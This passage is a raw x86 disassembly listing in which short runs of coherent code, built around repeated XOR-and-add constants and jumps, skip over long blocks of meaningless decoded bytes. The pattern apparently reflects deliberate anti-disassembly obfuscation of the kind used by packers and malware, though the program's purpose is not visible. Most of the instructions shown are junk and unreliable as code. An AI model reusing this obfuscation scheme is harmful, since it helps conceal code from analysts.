  4021e4:	mov    bl,0xac
  4021e6:	jl     0x4021f7
  4021e8:	loope  0x40224a
  4021ea:	ret    0x8bc2
  4021ed:	icebp  
  4021ee:	rcr    DWORD PTR [ebx-0x3bf8286a],1
  4021f4:	inc    ecx
  4021f5:	in     eax,0xeb
  4021f7:	pop    edi
  4021f8:	jo     0x402196
  4021fa:	dec    esp
  4021fb:	push   eax
  4021fc:	mov    ds:0x88e2a77c,al
  402201:	mov    esi,0x6cc11405
  402206:	popf   
  402207:	jmp    0x402223
  402209:	pop    ss
  40220a:	enter  0xf166,0x69
  40220e:	mov    BYTE PTR [esi-0x19],dl
  402211:	and    eax,0x90e768b
  402216:	ror    DWORD PTR [ebx+0xf1e0b8f],1
  40221c:	sub    DWORD PTR [ecx-0x42b4e4b8],esp
  402222:	(bad)  
  402223:	sub    ecx,DWORD PTR ds:0xd8b93545
  402229:	jge    0x40221a
  40222b:	or     al,0x74
  40222d:	push   cs
  40222e:	adc    edx,esp
  402230:	and    bl,BYTE PTR [ebx]
  402232:	mov    dl,0xdb
  402234:	js     0x402224
  402236:	(bad)  
  402237:	sar    BYTE PTR [edi+eax*2-0x7a5c4954],cl
  40223e:	cdq    
  40223f:	pop    ds
  402240:	jg     0x402226
  402242:	(bad)  
  402243:	jb     0x4021e4
  402245:	mov    eax,ds:0xd942e7fd
  40224a:	dec    edx
  40224b:	mov    ah,0xaf
  40224d:	call   0x4c8292c0
  402252:	or     BYTE PTR [esp+eax*4],ch
  402255:	repnz xlat BYTE PTR ds:[ebx]
  402257:	test   DWORD PTR [esi],esi
  402259:	inc    ecx
  40225a:	test   DWORD PTR [ecx],esi
  40225c:	pop    es
  40225d:	fisub  WORD PTR [ecx+edx*4-0x6]
  402261:	sbb    al,0xc1
  402263:	sbb    BYTE PTR [ecx-0x5ff01bc8],0xf9
  40226a:	pushf  
  40226b:	push   eax
  40226c:	icebp  
  40226d:	mov    al,ds:0x86534105
  402272:	into   
  402273:	sub    edi,DWORD PTR [ebp+0x63d9ed45]
  402279:	fadd   QWORD PTR [ecx-0x7eecb495]
  40227f:	fprem  
  402281:	dec    ecx
  402282:	mov    al,0x1a
  402284:	add    eax,0x695f282c
  402289:	xlat   BYTE PTR ds:[ebx]
  40228a:	scas   al,BYTE PTR es:[edi]
  40228b:	push   0x7c
  40228d:	stc    
  40228e:	jns    0x4022e6
  402290:	arpl   WORD PTR [eax-0x66],di
  402293:	sub    DWORD PTR [ecx-0x77],ebp
  402296:	inc    ebp
  402297:	or     al,0x8b
  402299:	inc    ebp
  40229a:	cld    
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0x2e
  4022b0:	mov    edi,0x9dcd938
  4022b5:	jl     0x402333
  4022b7:	mov    ds:0x6e7c7c7c,al
  4022bc:	fs xchg ecx,eax
  4022be:	sub    al,0xd8
  4022c0:	aad    0x28
  4022c2:	xchg   esp,eax
  4022c3:	jle    0x4022dd
  4022c5:	dec    esp
  4022c6:	xchg   BYTE PTR [ecx-0x4a],al
  4022c9:	mov    bl,0x31
  4022cb:	ret    0xb35d
  4022ce:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4022d0:	inc    edi
  4022d1:	test   DWORD PTR [eax-0x44],edi
  4022d4:	shl    DWORD PTR [esi],1
  4022d6:	fldenv [ecx+0x1a963764]
  4022dc:	test   esi,edx
  4022de:	xor    BYTE PTR [ecx-0x539d9bef],bl
  4022e4:	ficomp DWORD PTR [esi+0x5eceaa9b]
  4022ea:	jno    0x4022f2
  4022ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022ed:	lods   eax,DWORD PTR ds:[esi]
  4022ee:	gs cmp ah,0xb1
  4022f2:	mov    edi,0x71e11136
  4022f7:	dec    edx
  4022f8:	sahf   
  4022f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022fa:	inc    edx
  4022fb:	xor    cl,BYTE PTR [eax+0x5a30ff2c]
  402301:	sbb    ah,BYTE PTR [edi-0x18]
  402304:	cmp    esp,DWORD PTR [ecx*2-0x324590e9]
  40230b:	cmp    al,0x19
  40230d:	push   ebx
  40230e:	jb     0x402370
  402310:	ins    BYTE PTR es:[edi],dx
  402311:	je     0x402302
  402313:	sbb    al,0x5d
  402315:	add    DWORD PTR ds:[eax-0x62265b8e],ebp
  40231c:	out    0x9d,eax
  40231e:	cmp    BYTE PTR [edx+edx*2],dl
  402321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402322:	dec    ecx
  402323:	xchg   esi,eax
  402324:	pop    ss
  402325:	shr    ah,cl
  402327:	fdivr  QWORD PTR [ecx-0x34864638]
  40232d:	imul   esi,DWORD PTR [ebp+0x792c60f3],0xdb099d9d
  402337:	ret    
  402338:	cld    
  402339:	sbb    DWORD PTR [ebx],edi
  40233b:	sbb    al,0x38
  40233d:	sbb    al,0xa1
  40233f:	cmp    ch,cl
  402341:	jl     0x402384
  402343:	inc    ecx
  402344:	fs ret 
  402346:	inc    eax
  402347:	mov    ah,0xfe
  402349:	sti    
  40234a:	jp     0x4023be
  40234c:	ret    0x2bf0
  40234f:	loope  0x402345
  402351:	ds cmp al,0x42
  402354:	ror    cl,cl
  402356:	test   al,0xbc
  402358:	xchg   esp,eax
  402359:	jmp    0x40232c
  40235b:	or     DWORD PTR [ebx+edx*1+0x2f001b2c],esi
  402362:	iret   
  402363:	fdivrp st(3),st
  402365:	out    dx,al
  402366:	pop    edi
  402367:	xlat   BYTE PTR ds:[ebx]
  402368:	in     eax,dx
  402369:	cwde   
  40236a:	out    0x35,eax
  40236c:	(bad)  
  40236d:	shl    BYTE PTR [edx+0x70],cl
  402370:	iret   
  402371:	xor    eax,0x7510857
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	sbb    eax,0x284529c
  4023e7:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4023eb:	jl     0x402469
  4023ed:	jl     0x4023d7
  4023ef:	mov    ah,0x87
  4023f1:	imul   ebp,DWORD PTR ds:0x40e61092,0x1f3b3971
  4023fb:	adc    edi,eax
  4023fd:	xor    ch,BYTE PTR [ecx+0x6e6ea102]
  402403:	xchg   DWORD PTR [ebx+0x79],ecx
  402406:	ins    BYTE PTR es:[edi],dx
  402407:	xchg   esi,eax
  402408:	loope  0x4023d1
  40240a:	std    
  40240b:	jg     0x4023a6
  40240d:	dec    eax
  40240e:	mov    ch,0x32
  402410:	cmc    
  402411:	dec    ebp
  402412:	push   ds
  402413:	fidivr DWORD PTR ds:0x59948ad1
  402419:	test   edx,edx
  40241b:	dec    ebp
  40241c:	mov    ch,0xd8
  40241e:	addr16 out dx,eax
  402420:	xor    eax,0xed1e92c8
  402425:	ins    BYTE PTR es:[edi],dx
  402426:	fbld   TBYTE PTR [edi]
  402428:	iret   
  402429:	(bad)  
  40242a:	retf   
  40242b:	dec    esi
  40242c:	mov    bh,0x17
  40242e:	(bad)  
  40242f:	cmp    DWORD PTR [ecx-0x3975cfb5],esi
  402435:	aad    0xa9
  402437:	enter  0xad43,0x6d
  40243b:	test   al,0xd5
  40243d:	cmp    ebp,DWORD PTR [ebx+0x191bc144]
  402443:	adc    ebp,esp
  402445:	push   edi
  402446:	xchg   al,dh
  402448:	ins    BYTE PTR es:[edi],dx
  402449:	dec    esi
  40244a:	fiadd  DWORD PTR [ecx]
  40244c:	stos   DWORD PTR es:[edi],eax
  40244d:	mov    eax,0xe4a2de7a
  402452:	(bad)  
  402454:	leave  
  402455:	or     DWORD PTR [ebx+0x1f0ac6a8],esp
  40245b:	mov    WORD PTR [ebx],fs
  40245d:	push   ds
  40245e:	jecxz  0x40240a
  402460:	fbld   TBYTE PTR [edx+0xa]
  402463:	inc    ecx
  402464:	cwde   
  402465:	mov    WORD PTR [eax+0xb],gs
  402468:	inc    esi
  402469:	and    al,0xf0
  40246b:	mov    ds:0x27ce2abf,eax
  402470:	dec    eax
  402471:	push   eax
  402473:	push   edi
  402474:	xchg   edx,eax
  402475:	mov    edi,0x1fa33a3c
  40247a:	cmp    eax,0x3f48f1ac
  40247f:	mul    ebx
  402481:	ret    
  402482:	lock jns 0x4024bd
  402485:	jae    0x40241c
  402487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402488:	lods   al,BYTE PTR ds:[esi]
  402489:	mov    ebp,0x932b224d
  40248e:	sbb    eax,0xdcb1f667
  402493:	outs   dx,DWORD PTR ds:[esi]
  402494:	xor    esi,eax
  402496:	loop   0x4024b0
  402498:	pop    ds
  402499:	imul   esp,DWORD PTR [edx-0x206edfc1],0xffffff88
  4024a0:	enter  0xbbd,0x2c
  4024a4:	mov    eax,DWORD PTR [ebp-0x18]
  4024a7:	xor    eax,ecx
  4024a9:	add    eax,edx
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0xd6a5bfae
  4024c1:	sbb    al,0x31
  4024c3:	dec    eax
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x4024e3
  4024cc:	sar    DWORD PTR [esi+0x43],0x3
  4024d0:	ror    edx,cl
  4024d2:	ss int 0x67
  4024d5:	cmp    BYTE PTR [esi],dl
  4024d7:	ficomp DWORD PTR [edi]
  4024d9:	xchg   ebp,eax
  4024da:	pusha  
  4024db:	leave  
  4024dc:	aam    0x3
  4024de:	pop    ss
  4024df:	xchg   ecx,eax
  4024e0:	jnp    0x402491
  4024e2:	out    dx,al
  4024e3:	inc    esi
  4024e4:	mov    dh,0xb9
  4024e6:	loopne 0x402555
  4024e8:	pop    es
  4024e9:	je     0x402543
  4024eb:	and    al,BYTE PTR [edx]
  4024ed:	mov    ds:0x84b3bc02,al
  4024f2:	nop
  4024f3:	pusha  
  4024f4:	jle    0x402519
  4024f6:	xchg   ebx,eax
  4024f7:	bound  edi,QWORD PTR [ecx+eax*1]
  4024fa:	rep stos BYTE PTR es:[edi],al
  4024fc:	shr    cl,1
  4024fe:	aad    0x44
  402500:	ja     0x4024f8
  402502:	push   edi
  402503:	jno    0x40253f
  402505:	mov    ah,0xd5
  402507:	daa    
  402508:	fst    DWORD PTR [eax+edx*8-0xcc1145a]
  40250f:	push   ebp
  402510:	push   0x7d
  402512:	mov    cs,WORD PTR [edx+0x9]
  402515:	sbb    al,0x22
  402517:	jnp    0x4024ff
  402519:	pop    eax
  40251a:	mov    al,0x72
  40251c:	mov    ebp,0x5cae9caf
  402521:	sahf   
  402522:	pop    ds
  402523:	dec    ecx
  402524:	stos   DWORD PTR es:[edi],eax
  402525:	dec    esi
  402526:	mov    eax,?
  402528:	neg    BYTE PTR [edx-0x4e]
  40252b:	ret    
  40252c:	mov    WORD PTR ds:[eax+0x39],cs
  402530:	pusha  
  402531:	repz popf 
  402533:	sub    DWORD PTR [edi-0x11e2e8b1],ebx
  402539:	mov    esi,0xeb55a9a3
  40253e:	and    al,0xb9
  402540:	std    
  402541:	sub    eax,0x862ee9e8
  402546:	or     DWORD PTR [ebp-0x596a9a18],edi
  40254c:	ins    DWORD PTR es:[edi],dx
  40254d:	popf   
  40254e:	(bad)  
  40254f:	test   DWORD PTR [ecx+0x2ed6d85f],0xeee3bb13
  402559:	dec    eax
  40255a:	retf   0xe8b6
  40255d:	shl    DWORD PTR [esi+0x3b],0xd1
  402561:	and    BYTE PTR [esi+0x2fc31abb],dl
  402567:	lea    eax,[ebp+0x1c7d0c0c]
  40256d:	jnp    0x40252b
  40256f:	sub    edi,DWORD PTR [eax-0x56cb16f0]
  402575:	shl    BYTE PTR [ebx+0x20],0xfd
  402579:	pop    ebx
  40257a:	int3   
  40257b:	ret    
  40257c:	ror    cl,cl
  40257e:	nop
  40257f:	jecxz  0x4025b5
  402581:	imul   eax,DWORD PTR [edx]
  402584:	mov    edx,DWORD PTR [ebp-0x4]
  402587:	xor    edx,ecx
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    esp,edi
  402617:	(bad)  
  402618:	in     eax,0x7
  40261a:	dec    BYTE PTR [ebx]
  40261c:	jl     0x40269a
  40261e:	mov    ds:0xd27c7c7c,al
  402623:	push   eax
  402624:	mov    dl,0x5b
  402626:	cmc    
  402627:	xlat   BYTE PTR ds:[ebx]
  402628:	jp     0x4025cb
  40262a:	sub    bh,al
  40262c:	ins    DWORD PTR es:[edi],dx
  40262d:	xor    eax,DWORD PTR [ebp+0x3b]
  402630:	push   eax
  402631:	add    eax,0xfc649470
  402636:	lock ret 
  402638:	rcl    DWORD PTR [edi-0xa5e32bf],0xe7
  40263f:	jmp    0x8ffc3ea2
  402644:	mov    ds,esi
  402646:	or     al,0x32
  402648:	jbe    0x402668
  40264a:	ds ins DWORD PTR es:[edi],dx
  40264c:	ds jb  0x402661
  40264f:	xchg   esi,eax
  402650:	fidiv  DWORD PTR [edi]
  402652:	jbe    0x402608
  402654:	jae    0x4026c1
  402656:	jg     0x402615
  402658:	push   edi
  402659:	fisttp DWORD PTR [esi-0x3d5bd9b5]
  40265f:	aaa    
  402660:	sub    al,0x7d
  402662:	cmp    al,0x3d
  402664:	add    BYTE PTR [ecx+0x5b],0x6c
  402668:	or     BYTE PTR [ecx-0x3e],bl
  40266b:	and    eax,0xf8d58b64
  402670:	fwait
  402671:	jmp    DWORD PTR [esi+ebp*1]
  402674:	imul   edi,DWORD PTR [esi],0x60
  402677:	inc    edx
  402678:	pop    edx
  402679:	pop    es
  40267a:	push   edi
  40267b:	test   eax,0xbbec2796
  402680:	ret    0xe9e8
  402683:	push   edx
  402684:	dec    edx
  402685:	or     dl,cl
  402687:	and    al,0x4c
  402689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40268a:	data16 clc 
  40268c:	shl    DWORD PTR [esi+0x2cc17ffb],cl
  402692:	adc    BYTE PTR [esi+0x5e],dh
  402695:	jecxz  0x40263d
  402697:	cmp    BYTE PTR [esi+0x2f],bh
  40269a:	adc    ecx,ebp
  40269c:	mov    ch,0x3a
  40269e:	dec    ebp
  40269f:	ficom  DWORD PTR [ebx-0x3e7bd13c]
  4026a5:	sbb    ch,BYTE PTR [ebp-0x4ac3d4bc]
  4026ab:	fs push 0xffffffd7
  4026ae:	leave  
  4026af:	and    edi,0xffffff81
  4026b2:	scas   eax,DWORD PTR es:[edi]
  4026b3:	aas    
  4026b4:	jns    0x402654
  4026b6:	test   BYTE PTR [esi-0x35],ah
  4026b9:	es dec ecx
  4026bb:	mov    ecx,0xc27fbabd
  4026c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c2:	add    ecx,0x3689b055
  4026c8:	push   es
  4026c9:	(bad)  
  4026ca:	sahf   
  4026cb:	test   BYTE PTR [ebx+eiz*8+0xe81b62b],0xa7
  4026d3:	mov    ch,0x4d
  4026d5:	ja     0x4026d1
  4026d7:	sub    cl,BYTE PTR [ebx+0x5e9de]
  4026dd:	add    BYTE PTR [eax],al
  4026df:	mov    ebx,0x32729e
  4026e4:	mov    eax,DWORD PTR [ebp-0x4]
  4026e7:	xor    eax,0x7510857
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x14],?
  4026fe:	shl    DWORD PTR [edx+0x61],cl
  402701:	and    al,0xa
  402703:	jl     0x402781
  402705:	mov    ds:0xe47c7c7c,al
  40270a:	mov    ebx,0x26cd9aea
  40270f:	shl    DWORD PTR [eax+0x24bc751b],0x58
  402716:	xchg   ebx,eax
  402717:	fucomp st(1)
  402719:	pop    ebx
  40271a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40271b:	scas   eax,DWORD PTR es:[edi]
  40271c:	push   ecx
  40271d:	pop    esp
  40271e:	mov    WORD PTR [ecx],ds
  402720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402721:	je     0x40277e
  402723:	push   ecx
  402724:	aas    
  402725:	inc    edx
  402726:	adc    BYTE PTR [edx+0x77],bl
  402729:	push   ss
  40272a:	cdq    
  40272b:	rcl    BYTE PTR [esi-0x44bd6c5d],cl
  402731:	inc    ebp
  402732:	cmp    eax,0xc2d5
  402737:	add    BYTE PTR [edi+0x379b2f2a],dh
  40273d:	in     eax,dx
  40273e:	mov    ah,0x64
  402740:	js     0x4027b9
  402742:	cmp    al,al
  402744:	jg     0x402761
  402746:	lods   eax,DWORD PTR ds:[esi]
  402747:	pop    edi
  402748:	add    DWORD PTR [eax+0x1e02f27a],eax
  40274e:	jmp    0x8192:0x4a28ccf4
  402755:	adc    BYTE PTR [eax-0x3c],0x28
  402759:	ds sahf 
  40275b:	or     eax,0x4e03967f
  402760:	mov    ebx,0x67453624
  402765:	fxch   st(6)
  402767:	or     dl,BYTE PTR fs:[ecx+0x2a03857e]
  40276e:	ins    BYTE PTR es:[edi],dx
  40276f:	xor    ebp,edi
  402771:	je     0x402722
  402773:	sbb    BYTE PTR [ebx+0x34],ch
  402776:	ficom  WORD PTR [edx+0x74922f6c]
  40277c:	push   ss
  40277d:	jo     0x4027a4
  40277f:	stos   DWORD PTR es:[edi],eax
  402780:	adc    eax,0x64affb0e
  402785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402786:	outs   dx,BYTE PTR ds:[esi]
  402787:	cdq    
  402788:	or     eax,ebx
  40278a:	jmp    0x4027c3
  40278c:	mov    WORD PTR [ebx+0x6],gs
  40278f:	test   eax,edx
  402791:	in     al,dx
  402792:	bound  eax,QWORD PTR [edx+0x5afab948]
  402798:	push   cs
  402799:	aas    
  40279a:	test   BYTE PTR [ecx+0x6ee2a569],bh
  4027a0:	jmp    0x40272f
  4027a2:	push   esi
  4027a3:	mov    gs,edi
  4027a5:	xchg   DWORD PTR [ebp+0x185910f3],ebp
  4027ab:	cdq    
  4027ac:	pop    esp
  4027ad:	out    0xbe,eax
  4027af:	pusha  
  4027b0:	fisubr WORD PTR [ecx-0x735e89]
  4027b6:	jl     0x4027a9
  4027b8:	outs   dx,BYTE PTR ds:[esi]
  4027b9:	or     al,0x27
  4027bb:	inc    esi
  4027bc:	mov    edi,DWORD PTR [edi-0x59]
  4027bf:	add    eax,ebx
  4027c1:	mov    DWORD PTR [ebp-0xc],eax
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0x585e
  4027d7:	mov    esi,0x7c0a6a27
  4027dc:	jl     0x402780
  4027de:	jl     0x40285c
  4027e0:	jl     0x4027ef
  4027e2:	mov    ebx,0xfebe6872
  4027e7:	stc    
  4027e8:	aad    0x55
  4027ea:	enter  0x397b,0x7b
  4027ee:	xor    al,0xaa
  4027f0:	into   
  4027f1:	in     eax,0xae
  4027f3:	in     eax,0x48
  4027f5:	clc    
  4027f6:	sahf   
  4027f7:	(bad)  
  4027f8:	sub    edi,DWORD PTR [eax]
  4027fa:	fild   WORD PTR [eax+0x6b]
  4027fd:	and    BYTE PTR [esi+0x44f75694],0x1b
  402804:	push   ds
  402805:	and    DWORD PTR [eax-0x63],0x12
  402809:	stos   BYTE PTR es:[edi],al
  40280a:	scas   al,BYTE PTR es:[edi]
  40280b:	jns    0x402847
  40280d:	jl     0x402880
  40280f:	mov    BYTE PTR [eax+0x1c],cl
  402812:	das    
  402813:	push   0x20
  402815:	xchg   ecx,eax
  402816:	and    al,0x3f
  402818:	imul   edi,DWORD PTR [eax+eax*4],0x1f
  40281c:	xchg   dh,ah
  40281e:	sub    ah,BYTE PTR [esi+0x450c9b86]
  402824:	xor    eax,0x5ef4ca98
  402829:	mov    bh,0x85
  40282b:	sub    edi,DWORD PTR [esi+0x228b15a6]
  402831:	test   al,0xfe
  402833:	jmp    0x7477:0x10055b2b
  40283a:	lea    ebx,[edi+0x267916db]
  402840:	dec    edx
  402841:	pop    esp
  402842:	xor    al,0x90
  402844:	cdq    
  402845:	cmp    al,0x68
  402847:	test   al,0xaf
  402849:	jl     0x4028a6
  40284b:	imul   eax,DWORD PTR [ebx],0x33
  40284e:	mov    cl,0xdb
  402850:	or     al,0xc8
  402852:	pop    ebx
  402853:	iret   
  402854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402855:	dec    ebp
  402856:	jns    0x4028a0
  402858:	mov    eax,ds:0xb2f60ec8
  40285d:	adc    cl,cl
  40285f:	mov    ebx,0xd6e0b3d1
  402864:	mov    edx,0xda07c981
  402869:	or     edi,esi
  40286b:	xchg   ebx,eax
  40286c:	add    DWORD PTR [edi-0x52f621e5],edi
  402872:	(bad)  
  402873:	dec    esp
  402874:	mov    al,ds:0xc352add4
  402879:	in     eax,dx
  40287a:	ret    0xd964
  40287d:	mov    ebp,0xb2ec7f61
  402882:	xor    DWORD PTR [ebp*2+0x66718fba],ebp
  402889:	jl     0x40282b
  40288b:	dec    edi
  40288c:	and    al,0x71
  40288e:	pushf  
  40288f:	test   eax,0x6464ef59
  402894:	push   cs
  402895:	xchg   edi,eax
  402896:	sub    dh,BYTE PTR [ebx]
  402898:	fisttp DWORD PTR [ebp+0x1803f045]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	sub    BYTE PTR [ebp-0x7],0x3b
  4028ba:	jp     0x40284c
  4028bc:	or     eax,0x7ca27c7c
  4028c1:	jl     0x40293f
  4028c3:	js     0x40292b
  4028c5:	arpl   ax,bx
  4028c7:	pop    eax
  4028c8:	sub    eax,0x9bdc8e67
  4028cd:	mov    fs,esi
  4028cf:	mov    bl,0x2
  4028d1:	sbb    DWORD PTR [eax+edx*1-0x3a7977b2],edx
  4028d8:	outs   dx,BYTE PTR ds:[esi]
  4028d9:	mov    esi,0xd47481f9
  4028de:	lds    eax,FWORD PTR [eax+ecx*8+0x5e41142c]
  4028e5:	fcom   DWORD PTR [ecx+0x666a3a35]
  4028eb:	sub    BYTE PTR [esi],ah
  4028ed:	outs   dx,DWORD PTR ds:[esi]
  4028ee:	ret    0xf8c4
  4028f1:	mov    edi,0xf48f7f6b
  4028f6:	fwait
  4028f7:	aad    0x3b
  4028f9:	inc    ebx
  4028fa:	xor    BYTE PTR [esi-0x11cfd4cc],ah
  402900:	repnz popa 
  402902:	fsin   
  402904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402905:	retf   0xcb7f
  402908:	add    esi,0xffffffb7
  40290b:	out    0x8a,eax
  40290d:	xor    eax,0xf66b187f
  402912:	and    BYTE PTR [edi+eiz*2-0x6c599235],ah
  402919:	frstor [edx]
  40291b:	(bad)  
  40291c:	sbb    eax,0x1131be7c
  402921:	cli    
  402922:	test   al,0x37
  402924:	adc    ecx,edx
  402926:	jmp    0x402937
  402928:	inc    ebx
  402929:	adc    dh,ah
  40292b:	inc    eax
  40292c:	mov    esi,0xac95330c
  402931:	push   eax
  402932:	in     al,0xc8
  402934:	loopne 0x4028c0
  402936:	sar    BYTE PTR [eax+0x70f134a7],1
  40293c:	jo     0x402995
  40293e:	jb     0x402971
  402940:	inc    eax
  402941:	xor    eax,0xdab993bb
  402946:	aad    0x54
  402948:	mov    esi,0xc7f6ac9e
  40294d:	test   eax,0xbbcb8c9
  402952:	mov    ebp,es
  402954:	push   ecx
  402955:	add    eax,0xe7a0d7dd
  40295a:	pop    ds
  40295b:	loopne 0x4028e4
  40295d:	icebp  
  40295e:	mov    dl,0x28
  402960:	cvtdq2ps xmm4,XMMWORD PTR ds:0x12a6db57
  402967:	sub    edi,DWORD PTR fs:[edx]
  40296a:	mov    BYTE PTR [ebx+0x78],cl
  40296d:	pushf  
  40296e:	fcom   DWORD PTR [esi+0x5]
  402971:	(bad)  
  402972:	cli    
  402973:	push   esp
  402974:	cmp    ebp,ecx
  402976:	aad    0xd4
  402978:	adc    al,0xf
  40297a:	test   BYTE PTR [eax],bl
  40297c:	add    BYTE PTR [eax],al
  40297e:	add    BYTE PTR [edx+0x6a590a6a],dl
  402984:	add    al,0x5b
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	into   
  4029ae:	popa   
  4029af:	in     al,0x84
  4029b1:	(bad)  
  4029b2:	or     al,0x7c
  4029b4:	jl     0x402958
  4029b6:	jl     0x402a34
  4029b8:	jl     0x4029ca
  4029ba:	push   es
  4029bb:	dec    esi
  4029bc:	mov    fs,WORD PTR [edx+edi*4]
  4029bf:	out    0xae,eax
  4029c1:	js     0x402a3f
  4029c3:	scas   eax,DWORD PTR es:[edi]
  4029c4:	xor    ebp,DWORD PTR [ecx+0x4f]
  4029c7:	leave  
  4029c8:	enter  0x73d9,0xc9
  4029cc:	inc    ebp
  4029cd:	pop    ecx
  4029ce:	xor    eax,0x89679455
  4029d3:	enter  0x3689,0xa7
  4029d7:	jmp    0xf0eaa9ac
  4029dc:	and    al,BYTE PTR ds:0xe6af0dee
  4029e2:	push   esp
